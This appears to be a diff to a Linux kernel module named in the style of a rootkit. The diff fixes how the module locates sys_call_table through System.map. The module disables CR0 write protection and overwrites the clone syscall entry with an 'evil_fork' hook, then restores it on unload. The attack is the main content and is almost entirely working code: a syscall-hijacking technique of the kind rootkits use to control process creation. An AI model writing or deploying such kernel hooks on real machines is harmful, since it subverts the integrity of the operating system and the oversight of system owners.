@@ -124,6 +124,7 @@ asmlinkage long evil_fork (const struct pt_regs *regs) {
 }
 
 unsigned long *syscall_table;
+unsigned long *syscallTableAddress;
 
 int init_module (void) {
 	struct myfile *file;
@@ -155,7 +156,7 @@ int init_module (void) {
 	printk(KERN_INFO "System Map: %s\n", sysmapfile);
 	sysmap = open_file_for_read(sysmapfile);
 	syscallAddress = kmalloc (100, GFP_DMA | GFP_KERNEL);
-	syscallAddress[strlen(syscallAddress)] = '\0';
+	
 	while(1) {
 		entry = kmalloc (100, GFP_DMA | GFP_KERNEL);
 		entry[strlen(entry)] = '\0';
@@ -163,14 +164,14 @@ int init_module (void) {
 		if(strstr(entry, "sys_call_table") != NULL) {
 			
 			strncpy(syscallAddress, entry, 16);
-			
+			syscallAddress[strlen(syscallAddress)] = '\0';
+
 			printk(KERN_INFO "sys_call address: %s\n", syscallAddress);
 				unsigned long kPointer;
 			
 				sscanf(syscallAddress, "%lx", &kPointer);
-				sys_call_ptr_t *sys_call_table;
-				sys_call_table = (sys_call_ptr_t *)kPointer;
-				printk(KERN_INFO "sys_fork address: %lx\n", sys_call_table[__NR_clone]);
+				syscallTableAddress = (unsigned long *)kPointer;
+				printk(KERN_INFO "sys_fork address: %lx\n", syscallTableAddress[__NR_clone]);
 			break;
 		}
 	}
@@ -178,8 +179,8 @@ int init_module (void) {
 
 	
 
-	syscall_table = (void*) kallsyms_lookup_name("sys_call_table");
-
+	/*syscall_table = (void*) kallsyms_lookup_name("sys_call_table");
+	printk(KERN_INFO "sys_call address from kall: %lx\n", syscall_table);*/
 	/*if (syscall_table == NULL) {
 		printk (KERN_INFO "Could not find sys_call_table\n");
 	} else {
@@ -190,13 +191,13 @@ int init_module (void) {
 
 	write_cr0(read_cr0() & (~0x10000));
 
-	original_sys_fork = syscallAddress[__NR_clone];
+	original_sys_fork = syscallTableAddress[__NR_clone];
 
 	
 
 	/*set_page_rw(syscall_table);*/
 
-	syscallAddress[__NR_clone] = evil_fork;
+	syscallTableAddress[__NR_clone] = evil_fork;
 
 	/*original_sys_fork = (void *) xchg(&syscall_table[__NR_clone],evil_fork);*/
 
@@ -213,7 +214,7 @@ void cleanup_module(void) {
 
 	/*disable_write_protection();*/
 	
-	syscall_table[__NR_clone] = (void*) original_sys_fork;
+	syscallTableAddress[__NR_clone] = (void*) original_sys_fork;
 
 	/*xchg(&syscall_table[__NR_clone],original_sys_fork);*/
 	
